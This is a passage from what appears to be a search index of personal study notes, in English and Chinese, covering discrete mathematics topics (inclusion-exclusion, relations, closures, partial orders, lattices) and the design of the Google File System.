<li>\\((x^{3}+x^{4}+x^{5}+x^{6}+x^{7}+\\cdots)^{3}\\)</li> </ol>"},{"location":"dm/8/#extended-binomial-coefficient","title":"Extended Binomial Coefficient","text":"<p>extended binomial coefficient\\(\\begin{pmatrix}u \\\\k \\end{pmatrix}\\):</p> \\[ \\begin{pmatrix}u \\\\k \\end{pmatrix} = \\begin{cases} \\frac{u(u-1) \\ldots(u-k+1)}{k!} &amp; \\mathrm{if~} k&gt;0 \\\\1 &amp; \\mathrm{if~} k=0 \\end{cases} \\] <p>If \\(u\\) is negative integer, then extended binomial coefficient can also be represented as below: \\(\\begin{pmatrix}-n \\\\r \\end{pmatrix} = (-1) ^ r\\left(\\begin{array}{c}n+r-1\\\\r\\end{array}\\right)=(-1)^rC(n+r-1,r)\\)</p> <p>The extended binomial theorem\uff1aLet \\(x\\) be a real number with \\(|x| &lt; 1\\), and let \\(u\\) be a real number. Then \\((1+x)^u=\\sum_{k=0}^\\infty\\binom ukx^k\\)</p>"},{"location":"dm/8/#85-inclusion-exclusion","title":"8.5 Inclusion-Exclusion \u5bb9\u65a5\u539f\u7406","text":"\\[ \\mid A_1\\cup A_2\\cup \\cdots \\cup A_n\\mid=\\sum_{i=0}^n\\mid A_i\\mid - \\sum_{1\\leq i&lt;j\\leq n}\\mid A_i\\cap A_j\\mid + \\sum_{1\\leq i&lt;j&lt;k\\leq n}\\mid A_i\\cap A_j\\cap A_k\\mid + \\cdots + (-1)^{n+1} \\mid A_1\\cap A_2\\cap \\cdots \\cap A_n \\mid \\] How to prove it? Tip <p>Suppose a is a member of exactly \\(r\\) of the sets \\(A_1, A_2, \\ldots, A_n\\), it is counted \\(C(r, m)\\) times by the summation involving \\(m\\) of the sets \\(A_i\\)</p> <p>Example</p> <ol> <li>How many positive integers not exceeding 1000 that are not divisible by 5, 6 or 8?</li> <li>How many permutations of the 26 letters of the English alphabet do not contain any of the strings fish, rat or bird? 3.</li> </ol> <p>\u8ba1\u7b97\u80fd\u88ab6\u548c8\u6574\u9664\u7684\u5e76\u96c6\u65f6\u662f1000/24\uff08\u6700\u5c0f\u516c\u56e0\u6570\uff09\u800c\u4e0d\u662f1000/48</p>"},{"location":"dm/8/#86-applications-of-inclusion-exclusion","title":"8.6 Applications of Inclusion-Exclusion","text":"<p>Tip</p> <ul> <li>\u6838\u5fc3\u601d\u8def\u5c31\u662f\u6b63\u96be\u5219\u53cd\uff0c\u7136\u540e\u7528\u603b\u6570\u51cf\u53bb\u5177\u6709\u67d0\u4e9b\u6027\u8d28\u7684\u8ba1\u6570\u7ed3\u679c</li> <li>\u6bd4\u5982\u9519\u6392\u95ee\u9898\u4e2d\uff0c\u6b63\u770b\u67d0\u4e2a\u7269\u4f53\u7684\u4f4d\u7f6e\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f46\u5982\u679c\u53cd\u8fc7\u6765\u770b\u4ed6\u7684\u4f4d\u7f6e\u5c31\u662f\u786e\u5b9a\u7684\uff0c\u5e76\u4e14\u4e5f\u5bf9\u5176\u4ed6\u7269\u4f53\u7684\u4f4d\u7f6e\u6ca1\u6709\u8981\u6c42</li> </ul>"},{"location":"dm/8/#an-alternative-form-of-inclusion-exclusion","title":"An Alternative Form of Inclusion-Exclusion","text":"<ul> <li>How many solutions does \\(x_1 + x_2 + x_3 = 11\\) have,  where \\(x_1\\), \\(x_2\\) and \\(x_3\\) are nonnegative integers with \\(x_i &gt; n\\) ?</li> </ul>"},{"location":"dm/8/#the-sieve-of-eratosthenes","title":"The Sieve of Eratosthenes \u57c3\u6c0f\u7b5b\u6cd5","text":"<ul> <li>\u8ba1\u6570100\u4ee5\u5185\u7684\u6240\u6709\u8d28\u6570</li> <li>\u53cd: - \u4ee4\u00a0\\(P_i\\)\u00a0\u5206\u522b\u4e3a 100 \u4ee5\u5185\u88ab 2, 3, 5, 7 \u6574\u9664\u7684\u6574\u6570</li> </ul>"},{"location":"dm/8/#the-number-of-onto-functions","title":"The number of Onto Functions","text":"<p>\\(\\(n^m - C(n, 1)(n-1)^m - C(n, 2)(n-2)^m - \\cdots + (-1)^{n-1}C(n, n-1) \\cdot 1^m\\)\\) \u5458\u5de5\u5206\u5de5\u4f5c\uff0c\u8001\u5e08\u5206\u7cd6 \\(A=\\{a_1,a_2,\\ldots,a_m\\},B=\\{b_1,b_2,\\ldots,b_n\\}\\) \u53cd\uff1a\u4ee4 \\(P_i\\) \u4e3a \\(b_i\\) \u4e0d\u5728 \\(A\\to B\\) \u7684 range\u91cc</p> <p>Question</p> <ul> <li>In how many ways can seven different jobs be assigned to four different employees so that each employee is assigned at least one job and the most difficult job is assigned to the best employee?</li> </ul> answer <ul> <li>Solution 1: Temporarily ignore the additional condition -&gt; the probability that the most difficult job is assigned to the best employee is \\(\\frac{1}{4}\\)</li> <li>Solution 2: assign six jobs to four employee +  assign six jobs to three employee</li> <li> <p>Solution 3</p> <p>in my draft</p> </li> </ul>"},{"location":"dm/8/#derangement-the-hatcheck-problem","title":"Derangement \u5b8c\u5168\u9519\u6392 -&gt; The Hatcheck Problem","text":"\\[ D_n = n![1 - \\frac{1}{1!} + \\frac{1}{2!} - \\frac{1}{3!} + \\cdots + (-1)^n \\frac{1}{n!}] \\] \\[ \\frac{D_n}{n!} \\approx e^{-1} \\approx 0.368 \\]"},{"location":"dm/9/","title":"Chapter 9 Relations","text":""},{"location":"dm/9/#91-relations-and-their-properties-92-n-ary-relations","title":"9.1 Relations and Their Properties &amp; 9.2 n-ary Relations","text":"<ul> <li>binary relation from \\(A\\) to \\(B\\) is a subset of \\(A \\times B\\)</li> <li>\\(R \\subseteq A \\times B\\)</li> <li>\\(R=\\{(a,b)|a\\in A,b\\in B,aRb\\}\\)</li> </ul> <p>The relationship between function and relation</p> <ul> <li>Function is a special relation</li> <li>Relations are a generalization of graphs of function.</li> </ul> <p>Counting problem</p> <p>How many of relation on a set \\(A\\) is a relation from \\(A\\) to \\(A\\)?</p> Answer <p>\\(2^{|A|^2}\\)</p>"},{"location":"dm/9/#presenting-relations","title":"Presenting relations","text":"<ul> <li>list its all ordered pairs</li> <li>using a set build notation/specification by predicates</li> <li>2D table</li> <li>Connection matrix/zero-one matrix</li> <li>Directed graph/Digraph</li> </ul>"},{"location":"dm/9/#properties-of-relations","title":"properties of relations","text":"<ul> <li>reflexive(\u81ea\u53cd): \\(\\forall x(x\\in A\\to(x,x)\\in R)\\)</li> <li>irreflexive(\u53cd\u81ea\u53cd): \\(\\forall x(x\\in A\\to(x,x)\\notin R)\\)</li> <li>symmetric(\u5bf9\u79f0): \\(\\forall x\\forall y((x,y)\\in R\\to(y,x)\\in R)\\)</li> <li>antisymmetric(\u53cd\u5bf9\u79f0): \\(\\forall x\\forall y((x,y)\\in R\\land(y,x)\\in R\\to x=y)\\)</li> <li>asymmetric(\u975e\u5bf9\u79f0): \\(\\forall x \\forall y ((x, y) \\in R \\rightarrow (y, x) \\notin R)\\)</li> <li>transitive(\u4f20\u9012): \\(\\forall x\\forall y\\forall z((x,y)\\in R\\wedge(y,z)\\in R\\to(x,z)\\in R)\\)</li> </ul> Connection matrix digraph reflexive\\(2^{n^2 - n}\\) All elements on the main diagonal must be 1s. There is a loop at every vertex of the directed graph-&gt; each vertex has a loop to itself irreflexive\\(2^{n^2 - n}\\) All elements on the main diagonal must be 0s. No vertex has a loop to itself symmetric\\(2^\\frac{n(n+1)}{2}\\) The symmetric positions are both 0 or 1 If there is an arc(x, y) there must be an arc(y, x) -&gt; both bidirectional edge antisymmetric\\(2^n \\cdot  3^\\frac{n^2-n}{2}\\) Symmetric positions cannot both be 1 (they can both be 0) If there is an arc(x, y) there must be no arc(y, x) -&gt; no bidirectional edge asymmetric\\(3^\\frac{n^2-n}{2}\\) antisymmetric + irreflexive no bidirectional edge and loop to itself transitive \\(\\overline{\\left(m_{ij}\\wedge m_{jk}\\right)}\\vee m_{ik}=1\\) If there is an arc from x to y and one from y to z then theremust be one from x to z <p>No general formula that counts the number of transitive relations on a finite set is known</p> <ul> <li>inverse relation: \\(R^{-1}=\\{ (b,a)\\mid(a,b)\\in R \\}\\)</li> <li>complementary relation: \\(\\overline{R}=\\{ (a,b)\\mid(a,b)\\notin R \\}\\)</li> </ul> <p>When check the property transitive, we can ignore arc(x, x) or loops to itself</p> <ul> <li>reflexive and irreflexive are not opposites <ul> <li>a relation can be neither reflexive and irreflexive</li> <li>empty relation is reflexive and irreflexive(Only such relation fits!)</li> </ul> </li> <li>symmetric and antisymmetric are not opposites</li> <li>transitive doesn't require digraphs has a circle</li> </ul> <p>Question</p> <ul> <li>What property dose the relation x is a multiple of y on set of all integers/positive integers have? (NOTE: think carefully about all the properties of relation) </li> </ul> Answer <ul> <li>on set of all integers is reflexive, transitive</li> <li>on set of positive integers is reflexive, antisymmetric, transitive</li> </ul>"},{"location":"dm/9/#combining-relations","title":"Combining Relations","text":"<ul> <li>the notation \\(\\circ\\): take effect from right to left!!!</li> <li>\\(S\\circ R=\\{(a,c) \\mid a\\in A\\land c\\in C\\land \\exists b(aRb \\land bSc)\\}\\)</li> <li>\\(S\\circ R \\neq R\\circ S\\)</li> <li> <p>\\(S\\circ R=M_R\\cdot M_S\\)</p> </li> <li> <p>Definition(\\(R^n\\)): \\(R_1 = R, R^{n+1} = R^n \\circ R\\)</p> </li> <li>By associative law, we have \\(R^{n+1} = R \\circ R^n\\)</li> <li> <p>The relation \\(R\\) on a set \\(A\\) is transitive if and only if \\(R^n\\subseteq R, n=1,2,3,...\\)</p> <p>Try to proof it!</p> </li> </ul>"},{"location":"dm/9/#94-closures-of-relations","title":"9.4 Closures of Relations \u5173\u7cfb\u95ed\u5305","text":"<ul> <li>Definition: The closure of \\(R\\) with respect to \\(P\\) is the smallest relation \\(S\\) on \\(A\\) with property \\(P\\) that contains \\(R\\)</li> <li>smallest? is subset of all subset \\(A \\times A\\) containing \\(R\\) with property \\(P\\)</li> </ul>"},{"location":"dm/9/#different-types-of-closures","title":"Different Types of Closures","text":"Reflexive ClosureSymmetric ClosureTransitive Closure <ul> <li>\\(r(R)=R\\cup I_A,I_A=\\{(x,x)\\mid x\\in A\\}\\)</li> <li>\\(R=R\\cup I_A\\Leftrightarrow R\\) is reflexive</li> </ul> <ul> <li>\\(s(R)=R\\cup R^{-1}\\)</li> <li>\\(R=R\\cup R^{-1} \\Leftrightarrow R\\) is reflexive</li> </ul> <ul> <li>\\(t(R) = R^* = R\\cup R^2\\cup...UR^k\\)</li> <li>\\(t(R) = R^*\\) is transitive </li> <li> <p>How to obtain t(R)?</p> <ul> <li>brute solving</li> <li>Warshall\u2019s Algorithm(like Flyid Algorithm)</li> </ul> </li> </ul>"},{"location":"dm/9/#path","title":"Path","text":"<ul> <li>Let \\(R\\) be a relation on a set \\(A\\). There is a path the of length n, where n is a positive integer, from a to b if and only if \\((a, b) \\in R^n\\) </li> <li>Connectivity relation(\\(R^*\\)), consists of pairs (a, b) such that there is a path (in \\(R\\)) from a to b     \\(R^*=\\bigcup_{n=1}^\\infty R^n\\)</li> </ul> <p>The suggested order to computing closure</p> <p>s(R) -&gt; t(R) -&gt; r(R)</p>"},{"location":"dm/9/#95-equivalence-relations","title":"9.5 Equivalence Relations","text":"<ul> <li>equivalence relation ~: relation with property reflexive, symmetric, and transitive</li> <li>equivalence class \\([a]_R\\):</li> </ul>"},{"location":"dm/9/#96-partial-orderings","title":"9.6 Partial Orderings","text":"<ul> <li>partial order: relation with property reflexive, antisymmetric, and transitive</li> <li>partially ordered set/poset \\((S, R)\\): set of partial order \\(R\\) on set \\(S\\)</li> </ul> <ul> <li>\\(a \\preceq b\\): \\((a, b) \\in R\\)</li> <li>\\(a \\prec b\\): \\(a \\preceq b \\wedge a \\ne b\\)</li> <li>common partial order: \\(\\le, |, \\subseteq\\)</li> </ul> <ul> <li>Comparable: \\(a \\preceq b\\), or \\(b \\preceq a\\)</li> <li>Incomparable: not comparable</li> </ul> <ul> <li>total/linear order: every two elements of \\(S\\) are comparable</li> <li>well-ordered set: every nonempty subset of $S has a least element</li> </ul>"},{"location":"dm/9/#lexicographic-order","title":"Lexicographic Order","text":"<p>\\((a_1, a_2) \\prec (b_1, b_2)\\): \\(a_1 \\prec_1 b_1\\) or \\(a_1 = b_1 \\wedge a_2 \\prec_2 b_2\\)</p>"},{"location":"dm/9/#hasse-diagram","title":"Hasse Diagram","text":"<ul> <li> <p>Hasse diagram is obtained from the digraph for this relation. Below is the procedure:</p> </li> <li> <p>Construct a digraph representation of the poset (S, R)</p> </li> <li>remove all loops(that is, eliminate property reflexive)</li> <li>remove all redundant(\u591a\u4f59\u7684) edges(that is, eliminate property transitive)</li> <li>remove all arrows to obtain an undirected graph</li> </ul>"},{"location":"dm/9/#maximal-and-minimal-elements","title":"Maximal and Minimal Elements","text":"<ul> <li>maximal/minimal: \\(\\neg \\exists b \\in S(a \\prec b/b \\prec a)\\)</li> <li>greatest/least: \\(\\forall b \\in S(b \\preceq a/a \\preceq b)\\)</li> </ul> <ul> <li>upper/lower bound (of a set (1))</li> <li>greatest lower bound(g.l.b)/least upper bound(l.u.b)</li> </ul> <ol> <li>maybe a subset of given poset</li> </ol> <p>Question</p> <ol> <li>The greatest/least element are unique when they exist.</li> <li>The unique maximal/minimal element is greatest/least element</li> </ol> answer <ol> <li>\u221a</li> <li>\u00d7</li> </ol>"},{"location":"dm/9/#lattices","title":"Lattices","text":"<ul> <li>lattice: every pair of elements has a l.u.b and a g.l.b</li> </ul> <p>Example</p> ex1ex2ex3 <p>\\((Z, \\le)\\)</p> <ul> <li>l.u.b: the larger of the two elements</li> <li>g.l.b: the smallest of the two elements</li> </ul> <p>Every totally ordered set is a lattice.</p> <p>\\((Z^+, |)\\)</p> <ul> <li>l.u.b: the least common multiple </li> <li>g.l.b: the greatest common divisor</li> </ul> <p>\\((P(S), \\subseteq)\\)</p> <ul> <li>l.u.b: \\(S_1 \\cup S_2\\)</li> <li>g.l.b: \\(S_1 \\cap S_2\\)</li> </ul> <p>Determine the g.l.b and l.u.b of the below subsets</p> <ol> <li>\\((P(S), \\subseteq)\\), where \\(P(S)\\) is the power set of a set S</li> <li>\\((P(S), \\supseteq)\\), where \\(P(S)\\) is the power set of a set S</li> </ol> answer <ol> <li>g.l.b: \\(A \\cap B\\) &amp; l.u.b: \\(A \\cup B\\)</li> <li>g.l.b: \\(A \\cup B\\) &amp; l.u.b: \\(A \\cap B\\)</li> </ol>"},{"location":"dm/9/#topological-sorting","title":"Topological Sorting","text":"<p>Extra</p>"},{"location":"ds/GFS/","title":"GFS","text":"<p>\u6700\u4e3b\u8981\u7684\u7279\u6027\uff1a\u5f31\u4e00\u81f4\u6027(weak consistency)\uff0c\u5355\u4e3b(single-master)</p>"},{"location":"ds/GFS/#introduction","title":"Introduction","text":""},{"location":"ds/GFS/#architecture","title":"Architecture","text":"<ul> <li>\u4e00\u4e2a GFS \u96c6\u7fa4\u5305\u542b\u4e86 a single master, multiple chunkservers\uff0c\u5e76\u4e14\u53ef\u4ee5\u88ab\u591a\u4e2aclients\u8bbf\u95ee</li> <li>\u6bcf\u4e2a\u6587\u4ef6\u90fd\u4f1a\u88ab\u5206\u6210\u591a\u4e2a chunk(64MB in GFS)\uff0c\u6bcf\u4e2a chunk \u90fd\u4f1a\u6709\u4e00\u4e2a\u552f\u4e00\u7684 64bits \u7684 chunk handle \u6765\u6807\u8bc6\uff0c\u5e76\u4e14\u4e00\u822c\u4f1a\u6709\u4e09\u4e2a\u526f\u672c\u5b58\u50a8\u5230\u4e0d\u540c\u7684 chunkserver \u4e0a\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 chunk handle \u548c byte range(\u5b57\u8282\u8303\u56f4)\u6765\u786e\u5b9a\u8981\u8bfb\u5199\u7684\u5757</li> <li>single master \u5b58\u50a8 [[#^193eb2|metadata]]\uff0c\u5e76\u4e14\u63a7\u5236\u7cfb\u7edf\u7ea7\u6d3b\u52a8\uff0c\u5982 chunk \u7684\u79df\u7ea6\u7ba1\u7406\uff0c\u5783\u573e\u56de\u6536\uff0c\u548c chunk \u5728\u4e0d\u540c chunkserver \u4e4b\u524d\u7684\u8fc1\u79fb\uff0cmaster \u901a\u8fc7\u5fc3\u8df3\u673a\u5236\u6765\u4e0e\u6bcf\u4e2a chunkserver \u901a\u4fe1</li> <li>client \u53ef\u4ee5\u8ddf master \u548c\u6240\u6709\u7684 chunkservers \u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u7136\u540e client \u4e0a\u4f1a\u7f13\u5b58\u5143\u6570\u636e\uff0c\u800c\u4e0d\u4f1a\u7f13\u5b58\u6587\u4ef6\u6570\u636e\uff0c\u4e00\u65b9\u9762\u662f\u6587\u4ef6\u6570\u636e\u5f88\u5927\uff0c\u65e0\u6cd5\u7f13\u5b58\uff0c\u53e6\u4e00\u65b9\u9762\u5c31\u662f\u5982\u679c\u8981\u7f13\u5b58\u6570\u636e\u8fd8\u8981\u4fdd\u8bc1\u7f13\u5b58\u4e00\u81f4\u6027\u95ee\u9898\uff0c\u8fd9\u6837\u7cfb\u7edf\u5c31\u4f1a\u66f4\u52a0\u590d\u6742\u4e86\uff0c\u800c\u7f13\u5b58\u6587\u4ef6\u6570\u636e\u672c\u6765\u5c31\u662f\u4e2a\u6ca1\u4ec0\u4e48\u7528\u7684\u64cd\u4f5c</li> </ul>"},{"location":"ds/GFS/#single-master","title":"Single Master","text":"<p>GFS \u91c7\u7528\u4e86\u4e00\u7cfb\u5217\u63aa\u65bd\u6765\u786e\u4fdd master \u4e0d\u4f1a\u6210\u4e3a\u6574\u4e2a\u7cfb\u7edf\u7684\u74f6\u9888\uff1a</p> <ol> <li>\u6240\u6709\u7684\u6570\u636e\u6d41\u90fd\u4e0d\u7ecf\u8fc7 master\uff0c\u800c\u662f\u76f4\u63a5\u7531 client \u548c chunkserver \u4ea4\u4e92\uff08GFS \u628a\u63a7\u5236\u6d41\u548c\u6570\u636e\u6d41\u5206\u79bb\uff0c\u53ea\u6709\u63a7\u5236\u6d41\u624d\u4f1a\u7ecf\u8fc7 master\uff09</li> <li>client \u4f1a\u7f13\u5b58 master \u4e2d\u7684\u5143\u6570\u636e\uff0c\u5728\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u90fd\u65e0\u9700\u8bbf\u95ee master\u3002</li> <li>\u91c7\u7528\u4e86\u4e00\u4e9b\u624b\u6bb5\u6765\u8282\u7701 master \u7684\u5185\u5b58\uff0c\u5305\u62ec\u589e\u5927 chunk \u7684\u5927\u5c0f\u4ee5\u8282\u7701 chunk \u7684\u6570\u91cf\u3001\u5bf9\u5143\u6570\u636e\u8fdb\u884c\u5b9a\u5236\u5316\u7684\u538b\u7f29\u7b49\u3002    master \u53ef\u4ee5\u6839\u636e client \u63d0\u4f9b\u7684\u6587\u4ef6\u540d\u548c\u5b58\u50a8\u7684\u504f\u79fb\u91cf\u77e5\u9053\u526f\u672c\u6240\u5b58\u5728\u7684\u4f4d\u7f6e</li> </ol>"},{"location":"ds/GFS/#chunk-size","title":"Chunk Size","text":"<p>64MB(much larger than typical file system block sizes)</p> <ul> <li>advantage:</li> <li>reduces clients\u2019 need to interact with the master.</li> <li>perform many operations on a given chunk, it can reduce network overhead by keeping a persistent TCP connection to the chunkserver over an extended period of time.</li> <li>reduces the size of the metadata stored on the master.</li> <li>disadvantage:   1.</li> <li>hot spot</li> <li>internal fragmentation</li> </ul> <p>lazy space allocation:</p>"},{"location":"ds/GFS/#metadata","title":"Metadata \u5143\u6570\u636e","text":"<p>The master stores three major types of metadata(keep in memory):</p> <ul> <li>the file and chunk namespaces (persistence)</li> <li>the mapping from files to chunks (persistence)</li> <li>the locations of each chunk\u2019s replicas (nonpersistence)</li> </ul> <p>The first two types (namespaces and file-to-chunk mapping) are also kept persistent by logging mutations to an operation log stored on the master\u2019s local disk and replicated on remote machines. Using a log allows us to update the master state simply, reliably, and without risking inconsistencies in the event of a master crash.</p> <p>\u4e3a\u4ec0\u4e48 chunk \u526f\u672c\u7684\u4f4d\u7f6e\u4e0d\u6301\u4e45\u5316\uff1f \u53ef\u4ee5\u901a\u8fc7\u6301\u4e45\u5316\u6765\u6062\u590d master \u5b95\u673a\u65f6\u95f4\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u4fe1\u606f master \u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u6240\u6709 chunkservers \u6765\u83b7\u53d6\uff0c\u8003\u8651\u5230 master \u6302\u6389\u7684\u60c5\u51b5\u4e0d\u591a\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u5b58\u50a8\u6765\u7f29\u51cf metadata\uff0c\u4ece\u800c\u51cf\u5c11 master \u7684\u538b\u529b</p> <p>master \u4f1a\u5468\u671f\u6027\u5730\u626b\u63cf metadata\uff0c\u5b9e\u73b0\u5783\u573e\u56de\u6536\uff0cchunkserver \u6545\u969c\u65f6\u91cd\u505a\u526f\u672c\uff0c\u8d1f\u8f7d\u5747\u8861\u7b49\u529f\u80fd</p> <p>\u5176\u4ed6\u9ad8\u53ef\u7528\u8bbe\u8ba1\uff1a[[#^7424f7|Operation Log]]\u64cd\u4f5c\u65e5\u5fd7\u76f8\u5173</p>"},{"location":"ds/GFS/#consistency-model","title":"Consistency Model","text":"<p>\u6bcf\u4e2a chunk \u6587\u4ef6\u5728\u88ab\u4fee\u6539\u65f6\u5176 chunk version \u90fd\u4f1a\u81ea\u589e\uff0c\u5199\u64cd\u4f5c\u4f1a\u8bc6\u522b\u51fa\u90a3\u4e9b chunk version \u843d\u540e\u7684 chunk \u5e76\u8df3\u8fc7\u5199\uff0c\u8fd9\u4e9b\u843d\u540e\u7684 chunk \u4f1a\u5728\u5783\u573e\u56de\u6536\u8fc7\u7a0b\u88ab\u56de\u6536\u3002\u6bcf\u4e2a 64Mb \u7684 chunk \u6587\u4ef6\u7684\u6bcf\u4e2a 64Kb \u6570\u636e block\uff0c\u90fd\u4f1a\u8bb0\u5f55\u4e00\u4e2a checksum\uff08\u6301\u4e45\u5316\u5230\u4e13\u95e8\u7684 logging \u6587\u4ef6\uff09\uff0c\u8bfb\u53d6\u6570\u636e\u65f6\u9700\u6821\u9a8c checksum \u662f\u5426\u6b63\u786e\u6765\u5224\u65ad\u6570\u636e\u662f\u5426\u635f\u574f\u3002</p> <p>master \u5bf9\u4e8e\u5206\u5e03\u5f0f\u6587\u4ef6\u7684\u65b0\u589e\u3001\u5220\u9664\u662f\u5f3a\u4e00\u81f4\u6027\u7684\u3002GFS \u5728 master \u6709\u4e00\u4e2a\u6587\u4ef6\u9501\u7684\u8bbe\u8ba1\uff0c\u5bf9\u6587\u4ef6\u52a0\u5199\u9501\u53ef\u4ee5\u9632\u6b62\u5e76\u53d1\u521b\u5efa\u540c\u540d\u7684\u5206\u5e03\u5f0f\u6587\u4ef6\uff0c\u5bf9\u76ee\u5f55\u52a0\u5199\u9501\u53ef\u4ee5\u9632\u6b62\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u65b0\u589e\u548c\u5220\u9664\u3002</p> <ol> <li>\u5bf9\u4e00\u4e2a chunk \u6240\u6709\u526f\u672c\u7684\u5199\u5165\u987a\u5e8f\u90fd\u662f\u4e00\u81f4\u7684\u3002\u8fd9\u662f\u7531\u63a7\u5236\u6d41\u548c\u6570\u636e\u6d41\u5206\u79bb\u6280\u672f\u5b9e\u73b0\u7684\uff0c\u63a7\u5236\u6d41\u90fd\u662f\u7531 primary \u53d1\u51fa\uff0c\u800c\u526f\u672c\u7684\u5199\u5165\u987a\u5e8f\u4e5f\u662f\u7531 primary \u5230 secondary\u3002</li> <li>\u4f7f\u7528 chunk \u7248\u672c\u53f7\u6765\u68c0\u6d4b chunk \u526f\u672c\u662f\u5426\u51fa\u73b0\u8fc7\u5b95\u673a\u3002\u5931\u6548\u7684\u526f\u672c\u4e0d\u4f1a\u518d\u8fdb\u884c\u5199\u5165\u64cd\u4f5c master \u4e0d\u4f1a\u518d\u8bb0\u5f55\u8fd9\u4e2a\u526f\u672c\u7684\u4fe1\u606f(\u7b49 Client \u5237\u7f13\u5b58\u65f6\u540c\u6b65)\uff0cGC \u7a0b\u5e8f\u4f1a\u81ea\u52a8\u56de\u6536\u8fd9\u4e9b\u526f\u672c</li> <li>master \u4f1a\u5b9a\u671f\u68c0\u67e5 chunk \u526f\u672c\u7684 checksum \u6765\u786e\u8ba4\u5176\u662f\u5426\u6b63\u786e\u3002</li> <li>GFS \u63a8\u8350\u5e94\u7528\u66f4\u591a\u5730\u4f7f\u7528\u8ffd\u52a0\u6765\u8fbe\u5230\u66f4\u9ad8\u7684\u4e00\u81f4\u6027\u3002</li> </ol> <p>gfs\u5173\u4e8e\u5199\u7684\u4e24\u4e2a\u63a5\u53e3</p> <ul> <li>write \u64cd\u4f5c\u53ef\u4ee5\u5c06\u4efb\u610f\u2ed3\u5ea6 len \u7684\u6570\u636e\u5199\u5165\u5230\u4efb\u610f\u6307\u5b9a\u6587\u4ef6\u7684\u4f4d\u7f6e off set</li> <li>record append \u64cd\u4f5c\u53ef\u4ee5\u539f\u5b50\u7684\u5c06 len&lt;=16MB \u7684\u6570\u636e\u5199\u5165\u5230\u6307\u5b9a\u6587\u4ef6\u7684\u672b\u5c3e</li> </ul> <p></p>"},{"location":"ds/GFS/#gfs_1","title":"GFS \u7684\u9ad8\u53ef\u7528\u8bbe\u8ba1","text":"<p>\u9ad8\u53ef\u7528\u95ee\u9898\uff08\u5bb9\u9519\u95ee\u9898\uff09\uff1a\u5728\u53d1\u751f\u6545\u969c\u65f6\u4ecd\u80fd\u4e0d\u4e22\u5931\u6570\u636e\u5e76\u4fdd\u6301\u5bf9\u5916\u670d\u52a1 -&gt; \u5171\u8bc6\u7b97\u6cd5</p> <p>GFS \u8bde\u751f\u65f6\u5171\u8bc6\u7b97\u6cd5\u4e0d\u6210\u719f\uff0c\u6240\u4ee5 Google \u4e3a\u6b64\u989d\u5916\u8bbe\u8ba1\u4e86\u9ad8\u53ef\u7528\u65b9\u6848 \u89e3\u51b3\u95ee\u9898</p> <ol> <li>\u4fdd\u8bc1\u670d\u52a1\u5668\u5728\u6545\u969c\u65f6\u6587\u4ef6\u4e0d\u635f\u574f\u4e0d\u4e22\u5931    master \u7684 WAL \u548c\u4e3b\u5907\uff1bchunk \u7684\u591a\u526f\u672c</li> <li>\u5728\u8d85\u591a\u673a\u5668\u7684\u60c5\u51b5\u4e0b\uff0c\u5b9e\u73b0\u81ea\u52a8\u76d1\u63a7\u3001\u5bb9\u9519\u4e0e\u6062\u590d\uff08\u81ea\u52a8\u5207\u6362\u4e3b\u5907\uff09    master \u7684\u4e3b\u5907\u5207\u6362\u6709 chubby \u8d1f\u8d23\uff1bchunk \u7684\u79df\u7ea6\uff1bmaster \u8d1f\u8d23\u526f\u672c\u7684\u4f4d\u7f6e\u548c\u6570\u91cf <p>\u5f53\u65f6\u81ea\u52a8\u8fd0\u7ef4\u662f\u4e00\u4e2a\u6bd4\u8f83\u7279\u6b8a\u7684\u8bbe\u5b9a</p> </li> </ol>"},{"location":"ds/GFS/#master-metadata","title":"master \u9ad8\u53ef\u7528\u8bbe\u8ba1\uff08\u9488\u5bf9 metadata\uff09","text":"<p>^7424f7</p> <ul> <li>\u5b58\u5728 primary master \u548c shadow master\uff08\u4f5c\u4e3a\u5907\u4efd\uff09</li> <li>\u4f7f\u7528\u64cd\u4f5c\u65e5\u5fd7\u6765\u6301\u4e45\u5316\u5143\u6570\u636e</li> <li>\u751f\u6210\u65b0\u589e\u5143\u6570\u636e\u7684\u65e5\u5fd7\u5e76\u5199\u5165\u672c\u5730\u78c1\u76d8</li> <li>\u628a WAL(write head log)\u4f20\u8f93\u7ed9 shadow master</li> <li>\u5f97\u5230\u53cd\u9988\u540e\u518d\u6b63\u5f0f\u4fee\u6539 primary master \u7684\u5185\u5b58\u3002</li> <li>master \u53ef\u4ee5\u901a\u8fc7\u91cd\u653e\u64cd\u4f5c\u65e5\u5fd7\u6765\u6062\u590d\u6587\u4ef6\u7cfb\u7edf\u7684\u72b6\u6001</li> </ul> <p>\u81ea\u52a8\u5207\u6362\uff1a\u5982\u679c master \u5b95\u673a\uff0c\u4f1a\u901a\u8fc7 Google \u7684 Chubby \u6765\u8bc6\u522b\u5e76\u5207\u6362\u5230 shadow master(\u79d2\u7ea7\u64cd\u4f5c) \u548c MySQL \u7684\u4e3b\u5907\u673a\u5236\u975e\u5e38\u50cf</p>"},{"location":"ds/GFS/#chunk","title":"chunk \u7684\u9ad8\u53ef\u7528\u8bbe\u8ba1","text":"<ul> <li>\u5728 GFS \u4e2d\uff0c\u5bf9\u4e00\u4e2a chunk \u7684\u6bcf\u6b21\u5199\u5165\uff0c\u5fc5\u987b\u786e\u4fdd\u5728\u4e09\u4e2a\u526f\u672c\u4e2d\u7684\u5199\u5165\u90fd\u5b8c\u6210\uff0c\u624d\u89c6\u4e3a\u5199\u5165\u5b8c\u6210</li> <li>\u4e00\u4e2a chunk \u7684\u6240\u6709\u526f\u672c\u90fd\u4f1a\u5177\u6709\u5b8c\u6574\u7684\u6570\u636e\u3002</li> <li>\u5982\u679c\u4e00\u4e2a chunkserver \u5b95\u673a\uff0c\u5b83\u4e0a\u9762\u7684\u6240\u6709 chunk \u90fd\u6709\u53e6\u5916\u4e24\u4e2a\u526f\u672c\u4f9d\u65e7\u53ef\u4ee5\u4fdd\u5b58\u8fd9\u4e2a chunk \u7684\u6570\u636e\u3002</li> <li> <p>\u5982\u679c\u8fd9\u4e2a\u5b95\u673a\u7684\u526f\u672c\u5728\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd8\u6ca1\u6709\u6062\u590d\uff0c\u90a3\u4e48 master 